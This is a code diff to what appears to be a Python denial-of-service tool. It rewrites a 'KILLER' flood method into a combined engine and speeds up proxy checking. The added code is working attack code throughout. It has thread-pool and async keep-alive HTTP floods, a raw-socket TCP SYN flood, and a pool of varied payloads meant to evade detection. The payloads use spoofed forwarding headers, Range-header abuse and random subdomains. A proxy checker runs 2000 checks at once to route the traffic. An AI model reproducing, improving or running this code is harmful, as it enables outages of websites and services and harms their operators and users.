@@ -10,7 +10,7 @@ from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from re import compile
-from random import choice as randchoice, randint
+from random import choice as randchoice, randint, shuffle as randshuffle
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, SO_SNDBUF, TCP_NODELAY, gethostbyname,
                     gethostname, inet_aton, socket)
@@ -20,7 +20,7 @@ from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import argv
 from sys import exit as _exit
-from threading import Event, Thread
+from threading import Event, Lock, Thread
 from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
@@ -100,14 +100,22 @@ tor2webs = [
 with open(__dir__ / "config.json") as f:
     con = load(f)
 
+# Proxy checker configuration
+PROXY_CHECK_TIMEOUT: int = 2
+PROXY_CHECK_MAX_CONCURRENT: int = 2000
+PROXY_MIN_VERIFIED: int = 300
+PROXY_CACHE_TTL: int = 180
+
 # KILLER method configuration
 KILLER_MAX_WORKERS: int = min(500, (os.cpu_count() or 4) * 32)
 KILLER_ASYNC_CONNS: int = 2000
 KILLER_KEEPALIVE_REQS: int = 100
 KILLER_SNDBUF_SIZE: int = 262144
+KILLER_PAYLOAD_COUNT: int = 750
 _killer_pool: ThreadPoolExecutor = ThreadPoolExecutor(
     max_workers=KILLER_MAX_WORKERS, thread_name_prefix="killer")
-_killer_async_started: bool = False
+_killer_engine_lock: Lock = Lock()
+_killer_engine_launched: bool = False
 
 with socket(AF_INET, SOCK_DGRAM) as s:
     s.connect(("8.8.8.8", 80))
@@ -913,13 +921,8 @@ class HttpFlood(Thread):
                          'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
-        # Pre-computed minimal payload for KILLER (Tier 1: cache payload, skip random headers)
-        self._killer_payload: bytes = str.encode(
-            "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n" % (
-                target.raw_path_qs, self._target.authority
-            ))
-        # Pre-computed full payload for KILLER (with random headers pre-baked)
-        self._killer_full_payload: bytes = self.generate_payload()
+        # Polymorphic payload matrix for KILLER — pre-generated diverse request pool
+        self._killer_payloads: List[bytes] = self._build_killer_payloads(target)
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -1073,54 +1076,42 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
-        global _killer_async_started
-        payload: bytes = self._killer_payload
-
-        # Tier 1: Thread pool with keep-alive workers
-        for _ in range(KILLER_MAX_WORKERS):
-            _killer_pool.submit(self._killer_t1_worker, payload)
-
-        # Tier 2: Async I/O for massive concurrent connections (starts once globally)
-        if not _killer_async_started:
-            _killer_async_started = True
-            Thread(target=self._killer_t2_async_manager, args=(payload,), daemon=True).start()
-
-        # Tier 3: Raw socket flood (if admin privileges and not HTTPS)
-        if self._target.scheme.lower() != "https":
-            try:
-                Thread(target=self._killer_t3_raw_tcp, daemon=True).start()
-            except Exception:
-                pass
-
-        # Block this HttpFlood thread until attack ends (keeps thread alive)
+        global _killer_engine_launched
+        with _killer_engine_lock:
+            if not _killer_engine_launched:
+                _killer_engine_launched = True
+                payloads = self._killer_payloads
+                host = self._host
+                target = self._target
+                synevent = self._synevent
+                is_https = self._target.scheme.lower() == "https"
+                port = self._target.port or 80
+                Thread(target=self._killer_engine,
+                       args=(payloads, host, target, synevent, is_https, port),
+                       daemon=True).start()
         self._synevent.wait()
 
-    # ── Tier 1: Thread pool worker with keep-alive connection reuse ──
-    def _killer_t1_worker(self, payload: bytes) -> None:
+    # ── KILLER engine: launches all tiers once ──
+    @staticmethod
+    def _killer_engine(payloads: List[bytes], host: str, target: Any,
+                       synevent: Event, is_https: bool, port: int) -> None:
         buf_size = KILLER_SNDBUF_SIZE
-        while self._synevent.is_set():
-            try:
-                with self.open_connection() as s:
-                    try:
-                        s.setsockopt(IPPROTO_TCP, SO_SNDBUF, buf_size)
-                    except Exception:
-                        pass
-                    for _ in range(KILLER_KEEPALIVE_REQS):
-                        if not self._synevent.is_set():
-                            break
-                        if not Tools.send(s, payload):
-                            break
-            except Exception:
-                pass
+        payload_count = len(payloads)
 
-    # ── Tier 2: Async I/O for massive concurrency ──
-    def _killer_t2_async_manager(self, payload: bytes) -> None:
+        # Tier 1: Thread pool with keep-alive connection reuse
+        for _ in range(KILLER_MAX_WORKERS):
+            _killer_pool.submit(_killer_t1_worker, payloads, payload_count,
+                                host, port, is_https, synevent, buf_size)
+
+        # Tier 2: Async I/O for massive concurrent connections
         try:
             if os.name == 'nt':
                 asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
-            loop.run_until_complete(self._killer_t2_async_flood(payload))
+            loop.run_until_complete(
+                _killer_t2_async_flood(payloads, payload_count,
+                                       host, port, is_https, synevent))
         except Exception:
             pass
         finally:
@@ -1129,74 +1120,83 @@ class HttpFlood(Thread):
             except Exception:
                 pass
 
-    async def _killer_t2_async_flood(self, payload: bytes) -> None:
-        tasks = []
-        for _ in range(KILLER_ASYNC_CONNS):
-            tasks.append(asyncio.create_task(self._killer_t2_async_worker(payload)))
-        await asyncio.gather(*tasks, return_exceptions=True)
-
-    async def _killer_t2_async_worker(self, payload: bytes) -> None:
-        ssl_ctx = ctx if self._target.scheme.lower() == "https" else None
-        while self._synevent.is_set():
+        # Tier 3: Raw TCP SYN flood (admin/root only, not for HTTPS)
+        if not is_https:
             try:
-                reader, writer = await asyncio.wait_for(
-                    asyncio.open_connection(
-                        self._host,
-                        self._target.port or 80,
-                        ssl=ssl_ctx
-                    ),
-                    timeout=5.0
-                )
-                for _ in range(KILLER_KEEPALIVE_REQS):
-                    if not self._synevent.is_set():
-                        break
-                    writer.write(payload)
-                    await asyncio.wait_for(writer.drain(), timeout=2.0)
-                    global BYTES_SEND, REQUESTS_SENT
-                    BYTES_SEND += len(payload)
-                    REQUESTS_SENT += 1
-                writer.close()
-                await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
-            except Exception:
-                await asyncio.sleep(0.005)
-
-    # ── Tier 3: Raw TCP SYN flood (kernel bypass, requires admin/root) ──
-    def _killer_t3_raw_tcp(self) -> None:
-        target_ip = self._host
-        target_port = self._target.port or 80
-        raw_sock = None
-        try:
-            raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
-            raw_sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            raw_sock.settimeout(0.1)
-        except Exception:
-            return
-        while self._synevent.is_set():
-            try:
-                raw_sock.sendto(self._killer_t3_build_syn(target_ip), (target_ip, 0))
+                _killer_t3_raw_tcp(host, port, synevent)
             except Exception:
                 pass
 
-    def _killer_t3_build_syn(self, dst_ip: str) -> bytes:
-        ip_header = data_pack('!BBHHHBBH4s4s',
-                              0x45, 0, 40,  # version, TOS, total length
-                              0x1234,  # ID
-                              0x4000,  # flags/fragment
-                              64,  # TTL
-                              IPPROTO_TCP,  # protocol
-                              0,  # checksum (filled by kernel if IP_HDRINCL)
-                              inet_aton(__ip__),
-                              inet_aton(dst_ip))
-        tcp_header = data_pack('!HHLLBBHHH',
-                               randint(1024, 65535),  # source port
-                               self._target.port or 80,  # dest port
-                               randint(0, 0xFFFFFFFF),  # seq
-                               randint(0, 0xFFFFFFFF),  # ack
-                               (0x50 | 0x02),  # data offset + SYN flag
-                               0xFF,  # window
-                               0,  # checksum
-                               0)  # urgent pointer
-        return ip_header + tcp_header
+    # ── Build polymorphic payload matrix ──
+    def _build_killer_payloads(self, target: URL) -> List[bytes]:
+        payloads: List[bytes] = []
+        path = target.raw_path_qs
+        authority = self._target.authority
+        ua_list = self._useragents or ['Mozilla/5.0']
+        ref_list = self._referers or ['https://example.com']
+
+        for _ in range(KILLER_PAYLOAD_COUNT):
+            r = randint(0, 9)
+            if r == 0:
+                p = f"GET {path} HTTP/1.1\r\nHost: {authority}\r\nConnection: keep-alive\r\n\r\n"
+            elif r == 1:
+                qs = f"{'&' if '?' in path else '?'}{ProxyTools.Random.rand_str(6)}={ProxyTools.Random.rand_int(100000, 999999)}"
+                ua = randchoice(ua_list)
+                ref = randchoice(ref_list)
+                p = (f"GET {path}{qs} HTTP/1.1\r\nHost: {authority}\r\n"
+                     f"User-Agent: {ua}\r\nReferer: {ref}\r\n"
+                     f"Accept: */*\r\nConnection: keep-alive\r\n\r\n")
+            elif r == 2:
+                ua = randchoice(ua_list)
+                data = ProxyTools.Random.rand_str(32)
+                p = (f"POST {path} HTTP/1.1\r\nHost: {authority}\r\n"
+                     f"User-Agent: {ua}\r\n"
+                     f"Content-Type: application/json\r\n"
+                     f"Content-Length: {44 + len(data)}\r\n"
+                     f"Connection: keep-alive\r\n\r\n"
+                     f'{{"data":"{data}"}}')
+            elif r == 3:
+                ua = randchoice(ua_list)
+                data = ProxyTools.Random.rand_str(512)
+                p = (f"POST {path} HTTP/1.1\r\nHost: {authority}\r\n"
+                     f"User-Agent: {ua}\r\n"
+                     f"Content-Type: application/json\r\n"
+                     f"Content-Length: {44 + len(data)}\r\n"
+                     f"Connection: keep-alive\r\n\r\n"
+                     f'{{"data":"{data}"}}')
+            elif r == 4:
+                p = f"HEAD {path} HTTP/1.1\r\nHost: {authority}\r\nConnection: keep-alive\r\n\r\n"
+            elif r == 5:
+                ua = randchoice(ua_list)
+                ck = f"{ProxyTools.Random.rand_str(8)}={ProxyTools.Random.rand_str(16)}"
+                p = (f"GET {path} HTTP/1.1\r\nHost: {authority}\r\n"
+                     f"User-Agent: {ua}\r\nCookie: {ck}\r\n"
+                     f"Connection: keep-alive\r\n\r\n")
+            elif r == 6:
+                rhex = ProxyTools.Random.rand_str(randint(16, 64))
+                p = f"GET /{rhex} HTTP/1.1\r\nHost: {authority}\r\nConnection: keep-alive\r\n\r\n"
+            elif r == 7:
+                ua = randchoice(ua_list)
+                ranges = ",".join(f"5-{i}" for i in range(1, 128))
+                p = (f"GET {path} HTTP/1.1\r\nHost: {authority}\r\n"
+                     f"User-Agent: {ua}\r\n"
+                     f"Range: bytes=0-,{ranges}\r\n"
+                     f"Connection: keep-alive\r\n\r\n")
+            elif r == 8:
+                ua = randchoice(ua_list)
+                spoof = ProxyTools.Random.rand_ipv4()
+                p = (f"GET {path} HTTP/1.1\r\nHost: {authority}\r\n"
+                     f"User-Agent: {ua}\r\n"
+                     f"X-Forwarded-For: {spoof}\r\n"
+                     f"Client-IP: {spoof}\r\nReal-IP: {spoof}\r\n"
+                     f"Connection: keep-alive\r\n\r\n")
+            else:
+                sub = ProxyTools.Random.rand_str(randint(4, 12))
+                p = f"GET {path} HTTP/1.1\r\nHost: {sub}.{authority}\r\nConnection: keep-alive\r\n\r\n"
+            payloads.append(p.encode())
+
+        randshuffle(payloads)
+        return payloads
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
@@ -1501,6 +1501,162 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
 
+# ═══════════════════════════════════════════════════════════════
+# KILLER module-level worker functions (shared across all instances)
+# ═══════════════════════════════════════════════════════════════
+
+def _killer_open_connection(host: str, port: int, is_https: bool) -> Any:
+    sock = socket(AF_INET, SOCK_STREAM)
+    sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+    sock.settimeout(0.9)
+    sock.connect((host, port))
+    if is_https:
+        sock = ctx.wrap_socket(sock, server_hostname=host,
+                               server_side=False,
+                               do_handshake_on_connect=True,
+                               suppress_ragged_eofs=True)
+    return sock
+
+
+def _killer_t1_worker(payloads: List[bytes], payload_count: int,
+                      host: str, port: int, is_https: bool,
+                      synevent: Event, buf_size: int) -> None:
+    while synevent.is_set():
+        try:
+            s = _killer_open_connection(host, port, is_https)
+        except Exception:
+            continue
+        try:
+            s.setsockopt(IPPROTO_TCP, SO_SNDBUF, buf_size)
+        except Exception:
+            pass
+        try:
+            for _ in range(KILLER_KEEPALIVE_REQS):
+                if not synevent.is_set():
+                    break
+                payload = randchoice(payloads)
+                if not Tools.send(s, payload):
+                    break
+        except Exception:
+            pass
+        Tools.safe_close(s)
+
+
+async def _killer_t2_async_flood(payloads: List[bytes], payload_count: int,
+                                 host: str, port: int, is_https: bool,
+                                 synevent: Event) -> None:
+    tasks = []
+    for _ in range(KILLER_ASYNC_CONNS):
+        tasks.append(asyncio.create_task(
+            _killer_t2_async_worker(payloads, payload_count,
+                                    host, port, is_https, synevent)))
+    await asyncio.gather(*tasks, return_exceptions=True)
+
+
+async def _killer_t2_async_worker(payloads: List[bytes], payload_count: int,
+                                  host: str, port: int, is_https: bool,
+                                  synevent: Event) -> None:
+    ssl_ctx = ctx if is_https else None
+    while synevent.is_set():
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port, ssl=ssl_ctx),
+                timeout=5.0)
+        except Exception:
+            await asyncio.sleep(0.005)
+            continue
+        try:
+            for _ in range(KILLER_KEEPALIVE_REQS):
+                if not synevent.is_set():
+                    break
+                payload = randchoice(payloads)
+                writer.write(payload)
+                await asyncio.wait_for(writer.drain(), timeout=2.0)
+                global BYTES_SEND, REQUESTS_SENT
+                BYTES_SEND += len(payload)
+                REQUESTS_SENT += 1
+        except Exception:
+            pass
+        try:
+            writer.close()
+            await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
+        except Exception:
+            pass
+
+
+def _killer_t3_raw_tcp(host: str, port: int, synevent: Event) -> None:
+    raw_sock = None
+    try:
+        raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+        raw_sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+        raw_sock.settimeout(0.1)
+    except Exception:
+        return
+    while synevent.is_set():
+        try:
+            raw_sock.sendto(_killer_t3_build_syn(host, port), (host, 0))
+        except Exception:
+            pass
+
+
+def _killer_t3_build_syn(dst_ip: str, dst_port: int) -> bytes:
+    ip_header = data_pack('!BBHHHBBH4s4s',
+                          0x45, 0, 40,
+                          0x1234,
+                          0x4000,
+                          64,
+                          IPPROTO_TCP,
+                          0,
+                          inet_aton(__ip__),
+                          inet_aton(dst_ip))
+    tcp_header = data_pack('!HHLLBBHHH',
+                           randint(1024, 65535),
+                           dst_port,
+                           randint(0, 0xFFFFFFFF),
+                           randint(0, 0xFFFFFFFF),
+                           (0x50 | 0x02),
+                           0xFF,
+                           0,
+                           0)
+    return ip_header + tcp_header
+
+
+# ═══════════════════════════════════════════════════════════════
+# Fast proxy checker — async with 2000+ concurrency, 2s timeout
+# ═══════════════════════════════════════════════════════════════
+
+async def _check_proxies_fast(proxies: Collection[Proxy], url: str) -> Set[Proxy]:
+    verified: Set[Proxy] = set()
+    sem = asyncio.Semaphore(PROXY_CHECK_MAX_CONCURRENT)
+    lock = asyncio.Lock()
+
+    async def _check_one(proxy: Proxy) -> None:
+        async with sem:
+            try:
+                ok = await asyncio.wait_for(
+                    asyncio.to_thread(proxy.check, url, PROXY_CHECK_TIMEOUT),
+                    timeout=PROXY_CHECK_TIMEOUT + 0.5)
+                if ok:
+                    async with lock:
+                        verified.add(proxy)
+            except Exception:
+                pass
+
+    tasks = [asyncio.create_task(_check_one(p)) for p in proxies]
+    pending = set(tasks)
+    while pending:
+        done, pending = await asyncio.wait(pending, timeout=0.25,
+                                           return_when=asyncio.FIRST_COMPLETED)
+        if len(verified) >= PROXY_MIN_VERIFIED:
+            for t in pending:
+                t.cancel()
+            break
+    for t in tasks:
+        if not t.done():
+            t.cancel()
+    return verified
+
+
 class ProxyManager:
 
     @staticmethod
@@ -1781,29 +1937,58 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
         exit("Socks Type Not Found [4, 5, 1, 0, 6]")
     if proxy_ty == 6:
         proxy_ty = randchoice([4, 5, 1])
+
+    now = time()
+
+    # CACHE: reuse fresh proxy file to skip download + check entirely
+    if proxy_li.exists() and now - proxy_li.stat().st_mtime < PROXY_CACHE_TTL:
+        logger.info(
+            f"{bcolors.WARNING}Proxy file is fresh, using cached list{bcolors.RESET}")
+        proxies = ProxyUtiles.readFromFile(proxy_li)
+        if proxies:
+            logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
+            return proxies
+        proxies = None
+        return proxies
+
     if not proxy_li.exists():
-        logger.warning(
-            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
-        with proxy_li.open("w") as wr:
-            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-            logger.info(
-                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
-            )
-            Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=5, threads=threads,
-                url=url.human_repr() if url else "http://httpbin.org/get",
+        logger.info(
+            f"{bcolors.WARNING}Downloading proxies...{bcolors.RESET}")
+
+        all_proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
+        total = len(all_proxies)
+        if not total:
+            exit("No proxies could be downloaded from any provider")
+
+        target_url = url.human_repr() if url else "http://httpbin.org/get"
+        logger.info(
+            f"{bcolors.OKBLUE}{total:,}{bcolors.WARNING} proxies downloaded, checking with "
+            f"{PROXY_CHECK_MAX_CONCURRENT} concurrent workers ({PROXY_CHECK_TIMEOUT}s timeout)...{bcolors.RESET}")
+
+        # Fast parallel check using asyncio
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            verified = loop.run_until_complete(
+                _check_proxies_fast(all_proxies, target_url))
+            loop.close()
+        except Exception:
+            verified = set()
+
+        if not verified:
+            exit(
+                "Proxy Check failed, Your network may be the problem"
+                " | The target may not be available."
             )
 
-            if not Proxies:
-                exit(
-                    "Proxy Check failed, Your network may be the problem"
-                    " | The target may not be available."
-                )
-            stringBuilder = ""
-            for proxy in Proxies:
-                stringBuilder += (proxy.__str__() + "\n")
-            wr.write(stringBuilder)
+        # Write verified proxies to file
+        with proxy_li.open("w") as wr:
+            for proxy in verified:
+                wr.write(proxy.__str__() + "\n")
+
+        logger.info(
+            f"{bcolors.OKBLUE}{len(verified):,}/{total:,}{bcolors.WARNING} proxies verified and saved{bcolors.RESET}")
 
     proxies = ProxyUtiles.readFromFile(proxy_li)
     if proxies:
